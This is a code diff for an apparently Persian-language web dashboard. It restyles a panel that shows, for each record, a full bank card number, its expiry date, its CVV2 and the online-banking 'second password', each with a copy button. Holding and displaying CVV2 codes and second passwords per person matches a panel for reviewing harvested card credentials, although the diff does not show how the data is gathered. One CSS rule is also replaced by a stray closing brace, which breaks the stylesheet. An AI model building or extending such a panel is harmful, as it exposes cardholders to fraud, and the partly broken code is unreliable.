@@ -334,7 +334,7 @@ textarea{resize:vertical;min-height:55px}
 }
 
 /* ===== Bank Card Redesign ===== */
-.bank-card-display{display:grid;grid-template-columns:1.4fr 1fr 1fr 1fr 1fr;gap:6px;margin-top:6px}
+}
 .bank-card-display .info-cell{padding:6px 9px;font-size:13px}
 
 @media(max-width:768px){
@@ -402,6 +402,109 @@ textarea{resize:vertical;min-height:55px}
 }
 
 html[data-logged="1"] #loginScreen{display:none!important}
+
+/* ===== Bank Card - Beautiful Design ===== */
+.bank-card-display{
+  display:block!important;
+  margin-top:12px;
+  background:linear-gradient(135deg,rgba(30,41,59,0.9),rgba(15,23,42,0.9));
+  border:1px solid rgba(56,189,248,0.25);
+  border-radius:14px;
+  padding:14px;
+  box-shadow:0 4px 20px rgba(0,0,0,0.3);
+}
+.bank-header{
+  display:flex;
+  align-items:center;
+  gap:8px;
+  font-size:13px;
+  color:var(--accent);
+  margin-bottom:12px;
+  padding-bottom:10px;
+  border-bottom:1px solid rgba(56,189,248,0.15);
+}
+.bank-number-box{
+  background:linear-gradient(135deg,rgba(56,189,248,0.12),rgba(34,211,238,0.06));
+  border:1px solid rgba(56,189,248,0.35);
+  border-radius:12px;
+  padding:12px 14px;
+  display:flex;
+  align-items:center;
+  gap:10px;
+  margin-bottom:10px;
+}
+.bank-num-label{
+  font-size:11px;
+  color:var(--muted);
+  white-space:nowrap;
+}
+.bank-num-value{
+  font-size:18px;
+  font-weight:800;
+  color:#fff;
+  letter-spacing:2px;
+  flex:1;
+  text-align:center;
+}
+.bank-grid{
+  display:grid;
+  grid-template-columns:1fr 1fr 1fr;
+  gap:8px;
+  margin-bottom:10px;
+}
+.bank-cell{
+  background:rgba(15,23,42,0.7);
+  border:1px solid var(--border);
+  border-radius:10px;
+  padding:10px 6px;
+  text-align:center;
+}
+.bank-cell-label{
+  font-size:10.5px;
+  color:var(--muted);
+  margin-bottom:5px;
+  font-weight:600;
+}
+.bank-cell-value{
+  font-size:15px;
+  font-weight:700;
+  color:var(--accent);
+}
+.bank-pass2-box{
+  background:rgba(15,23,42,0.7);
+  border:1px solid var(--border);
+  border-radius:10px;
+  padding:10px 14px;
+  display:flex;
+  align-items:center;
+  gap:10px;
+}
+
+@media(max-width:768px){
+  .bank-card-display{
+    padding:12px;
+    margin-top:10px;
+  }
+  .bank-num-value{
+    font-size:14px;
+    letter-spacing:1px;
+  }
+  .bank-num-label{
+    font-size:10px;
+  }
+  .bank-cell{
+    padding:8px 4px;
+  }
+  .bank-cell-label{
+    font-size:10px;
+  }
+  .bank-cell-value{
+    font-size:14px;
+  }
+  .bank-header{
+    font-size:12px;
+  }
+}
 </style>
 </head>
 <body>
@@ -1034,21 +1137,34 @@ function renderMain(){
       <div style="margin-top:8px">
         <button class="mini danger" onclick="toggleCard('card_${d.id}',this)">👁 نمایش کارت بانکی</button>
         <div id="card_${d.id}" class="hidden bank-card-display">
-          <div class="info-cell bank-number-cell">
-            <span class="bank-number-label">💳 شماره کارت:</span>
-            <span class="bank-number-value ltr">${esc(c.num||'—')}</span>
+          <div class="bank-header">
+            <span style="font-size:16px">💳</span>
+            <span style="font-weight:700;color:#fff">کارت بانکی</span>
+          </div>
+          <div class="bank-number-box">
+            <div class="bank-num-label">شماره کارت</div>
+            <div class="bank-num-value ltr">${esc(c.num||'—')}</div>
             <button class="copy-btn" onclick="copyText('${esc(c.num||'')}',this)">📋</button>
           </div>
-          <div class="bank-extra-row">
-            <div class="info-cell">📅 ماه<b class="ltr">${esc(c.m||'--')}</b></div>
-            <div class="info-cell">📅 سال<b class="ltr">${esc(c.y||'--')}</b></div>
-            <div class="info-cell">🔒 CVV2<b class="ltr">${esc(c.cvv2||'—')}</b></div>
+          <div class="bank-grid">
+            <div class="bank-cell">
+              <div class="bank-cell-label">ماه</div>
+              <div class="bank-cell-value ltr">${esc(c.m||'--')}</div>
+            </div>
+            <div class="bank-cell">
+              <div class="bank-cell-label">سال</div>
+              <div class="bank-cell-value ltr">${esc(c.y||'--')}</div>
+            </div>
+            <div class="bank-cell">
+              <div class="bank-cell-label">CVV2</div>
+              <div class="bank-cell-value ltr">${esc(c.cvv2||'—')}</div>
+            </div>
           </div>
-          <div class="info-cell" style="grid-column:1">
-            🔑 رمز دوم: <b class="ltr">${esc(c.pass2||'—')}</b>
+          <div class="bank-pass2-box">
+            <div class="bank-num-label">رمز دوم</div>
+            <div class="bank-num-value ltr">${esc(c.pass2||'—')}</div>
           </div>
-        </div>
-      </div>`:''}
+        </div>`:''}
     </div>
     <div class="events-grid">
       ${renderEventSection(d, 'وبینار', '💻', 'var(--purple)')}
